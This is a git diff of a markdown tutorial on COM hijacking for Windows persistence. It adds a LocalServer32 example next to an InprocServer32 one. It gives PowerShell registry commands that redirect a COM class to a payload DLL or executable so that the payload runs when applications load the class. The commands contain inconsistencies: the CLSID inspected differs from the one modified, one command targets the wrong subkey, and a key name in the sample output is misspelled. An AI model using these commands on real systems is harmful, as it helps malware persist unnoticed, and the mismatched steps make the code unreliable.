@@ -25,9 +25,16 @@ To achieve this we can use Process Monitor from the SysInternal suite. Apply the
 
 - Path -> ends with -> InprocServer32
 
->   This register contains a 32-bit in-process server. In this context, that means a DLL that provides services to other applications
+>   This registry contains a 32-bit in-process server. In this context, that means a DLL that provides services to other applications
+
+- Path -> ends with -> LocalServer32
+
+>   This registry contains the full path to a COM server application. This means that we can specify the path to an executable which we want executed
 
 Now we will be able to see every process activity that meets this critera. To speed things up, we can open random applications (like Access, Outlook and so on). We should look for an object that is not referenced very frequently, as executing the payload every second is not a good idea.
+
+
+#### Example 1 - InprocServer32
 
 Let's take for example this COM object, with the CLSID `{4590F811-1D3A-11D0-891F-00AA004B2E24}` (The CLSID is an unique identifier for COM class objects)
 
@@ -48,13 +55,44 @@ InprocServer32                 (default)      : C:\Windows\System32\thumbcache.d
 
 If we can change the value of `(default)` from `C:\Windows\System32\thumbcache.dll` to our payload, persistence is succesfully established.
 
-```powershell
+```PowerShell
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Path\To\payload.dll"
 ```
 We also need to change the threading model to support both single threaded and multi-threaded mode.
 
-```powershell
+```PowerShell
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
 
 After we are done, we should delete the registry entry and DLL.
+
+#### Example 2 - LocalServer32
+
+We will consider an object with the same CLSID
+
+```
+HKLM:\Software\Classes\CLSID\{4590F811-1D3A-11D0-891F-00AA004B2E24}\LocalServer32
+```
+
+Now the contents will be something to the likes of
+
+```
+Get-Item -Path "HKLM:\Software\Classes\CLSID\{4590F811-1D3A-11D0-891F-00AA004B2E24}\LocalServer32"
+
+Name                           Property
+----                           --------
+Localerver32                   (default)      : C:\Program Files\Microsoft Office\Office14\EXCEL.EXE
+                               ServerExecutable : "C:\Program Files\Microsoft Office\Office14\EXCEL.EXE"
+```
+
+In this case we have to change the value of `(default)` and `ServerExecutable` to our payload, in PE format.
+
+```powershell
+New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "LocalServer32" -Value "C:\Path\To\payload.exe"
+```
+
+```powershell
+New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ServerExecutable" -Value "C:\Path\To\payload.exe"
+```
+
+To clean up, delete the executable and the registry entry.
